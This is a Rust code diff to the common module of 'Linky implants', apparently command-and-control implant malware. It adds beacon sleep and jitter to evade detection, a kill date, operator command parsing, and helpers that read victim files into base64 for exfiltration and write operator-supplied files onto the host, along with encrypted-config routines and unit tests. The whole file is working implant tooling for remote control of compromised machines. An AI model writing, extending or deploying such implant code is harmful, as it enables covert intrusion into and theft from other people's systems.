@@ -1,4 +1,10 @@
-// Common types and structures for Linky implants
+// Common types, state, and helpers for Linky implants
+
+use std::sync::atomic::{AtomicI64, AtomicU32, AtomicU64, Ordering};
+
+pub mod dispatch;
+
+// ── Wire types ────────────────────────────────────────────────────────────────
 
 /// Request sent during stage 2 (registration)
 #[derive(serde::Serialize)]
@@ -61,7 +67,6 @@ pub fn build_client() -> reqwest::blocking::Client {
 pub fn derive_key(secret: &str, salt: &str) -> [u8; 32] {
     use sha2::{Digest, Sha256};
 
-    // Create a key by hashing the secret and salt
     let mut hasher = Sha256::new();
     hasher.update(secret.as_bytes());
     hasher.update(salt.as_bytes());
@@ -79,24 +84,16 @@ pub fn encrypt_config(data: &str, key: &[u8; 32]) -> String {
         Aes256Gcm, Nonce,
     };
 
-    // Generate a random nonce (12 bytes for AES-GCM)
     let nonce_bytes = rand::random::<[u8; 12]>();
     let nonce = Nonce::from_slice(&nonce_bytes);
-
-    // Create cipher instance
     let cipher = Aes256Gcm::new_from_slice(key).expect("Failed to create cipher");
-
-    // Encrypt the data
     let ciphertext = cipher
         .encrypt(nonce, data.as_bytes())
         .expect("Encryption failure");
 
-    // Combine nonce and ciphertext
     let mut result = Vec::with_capacity(nonce.len() + ciphertext.len());
     result.extend_from_slice(nonce);
     result.extend_from_slice(&ciphertext);
-
-    // Return as hex string
     hex::encode(result)
 }
 
@@ -107,32 +104,309 @@ pub fn decrypt_config(encrypted_hex: &str, key: &[u8; 32]) -> Option<String> {
         Aes256Gcm, Nonce,
     };
 
-    // Decode hex string
-    let encrypted_data = match hex::decode(encrypted_hex) {
-        Ok(data) => data,
-        Err(_) => return None,
-    };
-
-    // Split nonce and ciphertext (nonce is 12 bytes for AES-GCM)
+    let encrypted_data = hex::decode(encrypted_hex).ok()?;
     if encrypted_data.len() < 12 {
         return None;
     }
-
     let nonce = Nonce::from_slice(&encrypted_data[..12]);
     let ciphertext = &encrypted_data[12..];
-
-    // Create cipher instance
-    let cipher = match Aes256Gcm::new_from_slice(key) {
-        Ok(c) => c,
-        Err(_) => return None,
-    };
-
-    // Decrypt the data
+    let cipher = Aes256Gcm::new_from_slice(key).ok()?;
     match cipher.decrypt(nonce, ciphertext) {
         Ok(decrypted) => String::from_utf8(decrypted).ok(),
         Err(_) => None,
     }
 }
 
+// ── State (sleep / jitter / kill date) ────────────────────────────────────────
+
+static SLEEP_SECONDS: AtomicU64 = AtomicU64::new(5);
+static JITTER_PERCENT: AtomicU32 = AtomicU32::new(0);
+/// `i64::MIN` is used as a sentinel meaning "no kill date set".
+static KILL_DATE: AtomicI64 = AtomicI64::new(i64::MIN);
+
+pub fn get_sleep_seconds() -> u64 {
+    SLEEP_SECONDS.load(Ordering::Relaxed)
+}
+
+pub fn set_sleep_seconds(seconds: u64) {
+    SLEEP_SECONDS.store(seconds, Ordering::Relaxed);
+}
+
+pub fn get_jitter_percent() -> u32 {
+    JITTER_PERCENT.load(Ordering::Relaxed)
+}
+
+pub fn set_jitter_percent(percent: u32) {
+    JITTER_PERCENT.store(percent.min(100), Ordering::Relaxed);
+}
+
+pub fn get_kill_date() -> Option<i64> {
+    let v = KILL_DATE.load(Ordering::Relaxed);
+    if v == i64::MIN { None } else { Some(v) }
+}
+
+pub fn set_kill_date(timestamp: Option<i64>) {
+    KILL_DATE.store(timestamp.unwrap_or(i64::MIN), Ordering::Relaxed);
+}
+
+/// Returns true if the kill date is set and has passed.
+pub fn should_exit() -> bool {
+    if let Some(kill_date) = get_kill_date() {
+        if let Ok(now) = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH) {
+            if now.as_secs() as i64 > kill_date {
+                return true;
+            }
+        }
+    }
+    false
+}
+
+// ── Timing ────────────────────────────────────────────────────────────────────
+
+pub fn sleep(secs: u64) {
+    std::thread::sleep(std::time::Duration::from_secs(secs));
+}
+
+pub fn sleep_with_jitter(base_seconds: u64, jitter_percent: u32) {
+    use rand::Rng;
+
+    if jitter_percent == 0 {
+        sleep(base_seconds);
+    } else {
+        let jitter_range = (base_seconds as f64 * jitter_percent as f64 / 100.0) as i64;
+        let mut rng = rand::thread_rng();
+        let jitter = rng.gen_range(-jitter_range..=jitter_range);
+        let sleep_time = if jitter.is_negative() {
+            base_seconds.saturating_sub(jitter.unsigned_abs())
+        } else {
+            base_seconds.saturating_add(jitter as u64)
+        };
+        sleep(sleep_time.max(1));
+    }
+}
+
+// ── Command helpers ───────────────────────────────────────────────────────────
+
+/// Split `"cmd rest…"` → `("cmd", "rest…")`.
+pub fn split_first(s: &str) -> (&str, &str) {
+    s.find(' ')
+        .map(|i| (&s[..i], s[i + 1..].trim_start()))
+        .unwrap_or((s, ""))
+}
+
+/// List directory entries, appending `/` to subdirectories.
+pub fn list_dir(path: &str) -> String {
+    match std::fs::read_dir(path) {
+        Ok(entries) => entries
+            .flatten()
+            .map(|e| {
+                let name = e.file_name().to_string_lossy().into_owned();
+                if e.file_type().map(|t| t.is_dir()).unwrap_or(false) {
+                    format!("{}/", name)
+                } else {
+                    name
+                }
+            })
+            .collect::<Vec<_>>()
+            .join("\n"),
+        Err(e) => format!("[-] {}", e),
+    }
+}
+
+/// Read a file and return its content as `FILE:<path>:<base64>`.
+pub fn download_file(path: &str) -> String {
+    use base64::{engine::general_purpose::STANDARD, Engine as _};
+    if path.is_empty() {
+        return "[-] Usage: download <file_path>".to_string();
+    }
+    match std::fs::read(path) {
+        Ok(buf) => format!("FILE:{}:{}", path, STANDARD.encode(&buf)),
+        Err(e) => format!("[-] Failed to read file: {}", e),
+    }
+}
+
+/// Decode base64 content and write to destination path.
+/// `args` format: `<base64_content> <destination_path>`
+pub fn upload_file(args: &str) -> String {
+    use base64::{engine::general_purpose::STANDARD, Engine as _};
+    if args.is_empty() {
+        return "[-] Usage: upload <base64_content> <destination_path>".to_string();
+    }
+    let (content, path) = match args.find(' ') {
+        Some(i) => (&args[..i], args[i + 1..].trim_start()),
+        None => return "[-] Invalid upload command format".to_string(),
+    };
+    let decoded = match STANDARD.decode(content) {
+        Ok(data) => data,
+        Err(e) => return format!("[-] Failed to decode base64: {}", e),
+    };
+    match std::fs::write(path, &decoded) {
+        Ok(()) => format!("[+] File uploaded successfully: {}", path),
+        Err(e) => format!("[-] Failed to write file: {}", e),
+    }
+}
+
+pub fn handle_sleep_command(args: &str) -> String {
+    if args.is_empty() {
+        return format!(
+            "Current sleep: {} seconds, jitter: {}%",
+            get_sleep_seconds(),
+            get_jitter_percent()
+        );
+    }
+    let parts: Vec<&str> = args.split_whitespace().collect();
+    if !parts.is_empty() {
+        if let Ok(new_sleep) = parts[0].parse::<u64>() {
+            set_sleep_seconds(new_sleep);
+            if parts.len() > 1 {
+                if let Ok(new_jitter) = parts[1].parse::<u32>() {
+                    set_jitter_percent(new_jitter);
+                    return format!(
+                        "[+] Sleep updated: {} seconds, jitter: {}%",
+                        get_sleep_seconds(),
+                        get_jitter_percent()
+                    );
+                }
+            }
+            return format!("[+] Sleep updated: {} seconds", get_sleep_seconds());
+        }
+    }
+    "[-] Usage: sleep <seconds> [jitter_percent]".to_string()
+}
+
+pub fn handle_killdate_command(args: &str) -> String {
+    if args.is_empty() {
+        return match get_kill_date() {
+            Some(ts) => match chrono::DateTime::<chrono::Utc>::from_timestamp_secs(ts) {
+                Some(dt) => format!("Current kill date: {}", dt.format("%Y-%m-%d %H:%M:%S")),
+                None => format!("Current kill date: {} (invalid timestamp)", ts),
+            },
+            None => "No kill date set".to_string(),
+        };
+    }
+
+    if args.to_lowercase() == "clear" {
+        set_kill_date(None);
+        return "[+] Kill date cleared".to_string();
+    }
+
+    if let Ok(ts) = args.parse::<i64>() {
+        set_kill_date(Some(ts));
+        return match chrono::DateTime::<chrono::Utc>::from_timestamp_secs(ts) {
+            Some(dt) => format!("[+] Kill date set to: {}", dt.format("%Y-%m-%d %H:%M:%S")),
+            None => format!("[+] Kill date set to timestamp: {}", ts),
+        };
+    }
+
+    let formats = [
+        "%Y-%m-%d",
+        "%Y-%m-%d %H:%M:%S",
+        "%Y/%m/%d",
+        "%Y/%m/%d %H:%M:%S",
+    ];
+    for fmt in formats {
+        if let Ok(dt) = chrono::NaiveDateTime::parse_from_str(args, fmt) {
+            let ts = dt.and_utc().timestamp();
+            set_kill_date(Some(ts));
+            return format!("[+] Kill date set to: {}", dt.format("%Y-%m-%d %H:%M:%S"));
+        }
+    }
+    "[-] Usage: killdate [timestamp|YYYY-MM-DD|clear]".to_string()
+}
+
 // Re-export common types for convenience
 pub use serde_json;
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn test_split_first_with_space() {
+        assert_eq!(split_first("sleep 30"), ("sleep", "30"));
+    }
+
+    #[test]
+    fn test_split_first_no_space() {
+        assert_eq!(split_first("whoami"), ("whoami", ""));
+    }
+
+    #[test]
+    fn test_split_first_empty() {
+        assert_eq!(split_first(""), ("", ""));
+    }
+
+    #[test]
+    fn test_split_first_trims_args() {
+        assert_eq!(split_first("cd   /tmp"), ("cd", "/tmp"));
+    }
+
+    #[test]
+    fn test_encrypt_decrypt_roundtrip() {
+        let key = derive_key("test-secret", "test-salt");
+        let plaintext = "hello world";
+        let encrypted = encrypt_config(plaintext, &key);
+        let decrypted = decrypt_config(&encrypted, &key).unwrap();
+        assert_eq!(decrypted, plaintext);
+    }
+
+    #[test]
+    fn test_decrypt_invalid_hex_returns_none() {
+        let key = derive_key("test-secret", "test-salt");
+        assert!(decrypt_config("not-hex!", &key).is_none());
+    }
+
+    #[test]
+    fn test_decrypt_too_short_returns_none() {
+        let key = derive_key("test-secret", "test-salt");
+        // 10 bytes < 12 (nonce size)
+        assert!(decrypt_config("aabbccdd1122334455ff", &key).is_none());
+    }
+
+    #[test]
+    fn test_sleep_with_jitter_no_panic() {
+        // jitter=100 should not panic
+        sleep_with_jitter(1, 100);
+    }
+
+    #[test]
+    fn test_handle_sleep_command_parse() {
+        let result = handle_sleep_command("10 20");
+        assert!(result.contains("10 seconds"));
+        assert!(result.contains("20%"));
+    }
+
+    #[test]
+    fn test_handle_sleep_command_empty_shows_current() {
+        let result = handle_sleep_command("");
+        assert!(result.contains("seconds"));
+        assert!(result.contains("jitter"));
+    }
+
+    #[test]
+    fn test_handle_killdate_command_clear() {
+        set_kill_date(Some(9999999999));
+        let result = handle_killdate_command("clear");
+        assert_eq!(result, "[+] Kill date cleared");
+        assert!(get_kill_date().is_none());
+    }
+
+    #[test]
+    fn test_handle_killdate_command_timestamp() {
+        let result = handle_killdate_command("1893456000");
+        assert!(result.contains("[+] Kill date set to"));
+    }
+
+    #[test]
+    fn test_should_exit_no_killdate() {
+        set_kill_date(None);
+        assert!(!should_exit());
+    }
+
+    #[test]
+    fn test_should_exit_past_killdate() {
+        set_kill_date(Some(1)); // Unix epoch + 1s, definitely in the past
+        assert!(should_exit());
+        set_kill_date(None); // cleanup
+    }
+}
